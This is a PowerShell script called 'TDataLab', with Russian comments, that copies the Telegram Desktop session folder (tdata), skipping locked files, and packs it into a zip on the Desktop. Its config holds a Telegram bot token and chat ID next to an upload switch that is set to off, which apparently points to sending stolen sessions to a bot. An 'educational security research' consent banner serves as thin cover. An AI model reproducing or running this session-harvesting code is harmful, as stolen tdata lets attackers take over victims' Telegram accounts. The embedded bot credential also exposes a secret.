<#
.SYNOPSIS
    Исправленная версия TDataLab с обработкой заблокированных файлов.
    Пропускает файлы, которые используются Telegram, но остальные копирует.
#>

#region CONFIG
$script:CONFIG = @{
    ConsentRequired   = $true
    EnableUpload      = $false
    BotToken          = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"
    ChatId            = "243855738"
    OutputDir         = "$env:USERPROFILE\Desktop"
    ZipName           = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    LogFile           = "$env:USERPROFILE\Desktop\TDataLab.log"
    TDataPath         = "$env:APPDATA\Telegram Desktop\tdata"
    TempCopyDir       = "$env:TEMP\TDATA_Temp_$(Get-Random)"
}
#endregion

#region LOGGING
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    Add-Content -Path $script:CONFIG.LogFile -Value $logEntry -ErrorAction SilentlyContinue
    Write-Host $logEntry
}
#endregion

#region CONSENT
function Test-Consent {
    if (-not $script:CONFIG.ConsentRequired) { return $true }
    Clear-Host
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "  TDataLab – Educational Security Research Framework (FIXED)" -ForegroundColor Yellow
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "This script will:" -ForegroundColor White
    Write-Host "  1. Copy all AVAILABLE files from Telegram session folder" -ForegroundColor Gray
    Write-Host "  2. Skip locked files (used by Telegram)" -ForegroundColor Gray
    Write-Host "  3. Create a compressed archive" -ForegroundColor Gray
    Write-Host "  4. Save the archive locally" -ForegroundColor Green
    Write-Host ""
    Write-Host "⚠️  By proceeding, you confirm that:" -ForegroundColor Red
    Write-Host "    - You are the owner of this machine" -ForegroundColor Red
    Write-Host "    - This is for educational/defensive research only" -ForegroundColor Red
    Write-Host "    - You will not use this against others" -ForegroundColor Red
    Write-Host ""
    $response = Read-Host "Type 'YES' to continue or any other key to exit"
    if ($response -ne "YES") {
        Write-Log "Consent denied. Exiting." "WARN"
        return $false
    }
    Write-Log "Consent granted." "INFO"
    return $true
}
#endregion

#region CORE LOGIC
function Copy-AvailableFiles {
    param([string]$SourcePath, [string]$DestPath)
    
    Write-Log "Copying available files from: $SourcePath" "INFO"
    $copied = 0
    $skipped = 0
    $skippedFiles = @()
    
    # Создаём структуру папок
    Get-ChildItem -Path $SourcePath -Directory -Recurse | ForEach-Object {
        $targetDir = $_.FullName.Replace($SourcePath, $DestPath)
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }
    }
    
    # Копируем файлы с проверкой блокировки
    Get-ChildItem -Path $SourcePath -File -Recurse | ForEach-Object {
        $sourceFile = $_.FullName
        $relativePath = $sourceFile.Replace($SourcePath, "")
        $targetFile = $DestPath + $relativePath
        
        try {
            # Проверяем, можно ли прочитать файл (с блокировкой на 1 сек)
            $fs = [System.IO.File]::Open($sourceFile, 'Open', 'Read', 'Read')
            $fs.Close()
            
            # Копируем
            Copy-Item -Path $sourceFile -Destination $targetFile -Force -ErrorAction Stop
            $copied++
        } catch {
            # Файл заблокирован — пропускаем
            $skipped++
            $skippedFiles += $relativePath
            Write-Log "SKIPPED (locked): $relativePath" "WARN"
        }
    }
    
    Write-Log "Copied: $copied files, Skipped: $skipped files (locked)" "INFO"
    if ($skippedFiles.Count -gt 0) {
        $skipLog = "$DestPath\skipped_files.txt"
        $skippedFiles | Out-File -FilePath $skipLog
        Write-Log "List of skipped files saved to: $skipLog" "INFO"
    }
    return @{Copied = $copied; Skipped = $skipped}
}

function Compress-TData {
    param([string]$SourcePath, [string]$ZipPath)
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $ZipPath)
        Write-Log "Archive created: $ZipPath" "INFO"
        return $true
    } catch {
        Write-Log "Compression failed: $_" "ERROR"
        return $false
    }
}
#endregion

#region MAIN
function Start-TDataLab {
    Write-Log "=========================================" "INFO"
    Write-Log "TDataLab session started." "INFO"
    Write-Log "=========================================" "INFO"

    if (-not (Test-Consent)) { return }

    $tdataPath = $script:CONFIG.TDataPath
    if (-not (Test-Path $tdataPath)) {
        Write-Log "TData folder not found. Exiting." "WARN"
        return
    }

    # Создаём временную папку для копирования
    $tempCopy = $script:CONFIG.TempCopyDir
    if (Test-Path $tempCopy) { Remove-Item $tempCopy -Recurse -Force }
    New-Item -ItemType Directory -Path $tempCopy -Force | Out-Null
    Write-Log "Temp folder created: $tempCopy" "INFO"

    # Копируем доступные файлы
    $result = Copy-AvailableFiles -SourcePath $tdataPath -DestPath $tempCopy
    if ($result.Copied -eq 0) {
        Write-Log "No files could be copied. Exiting." "ERROR"
        Remove-Item $tempCopy -Recurse -Force
        return
    }

    # Архивируем
    $zipFullPath = Join-Path $script:CONFIG.OutputDir $script:CONFIG.ZipName
    $compressOk = Compress-TData -SourcePath $tempCopy -ZipPath $zipFullPath

    # Очистка
    Remove-Item $tempCopy -Recurse -Force
    Write-Log "Temp folder cleaned." "INFO"

    if ($compressOk) {
        Write-Log "Archive saved: $zipFullPath" "INFO"
        Write-Log "Copied: $($result.Copied) files, Skipped: $($result.Skipped) locked files" "INFO"
    } else {
        Write-Log "Compression failed. Archive not created." "ERROR"
    }

    Write-Log "=========================================" "INFO"
    Write-Log "TDataLab session completed." "INFO"
    Write-Log "=========================================" "INFO"
}
#endregion

Start-TDataLab
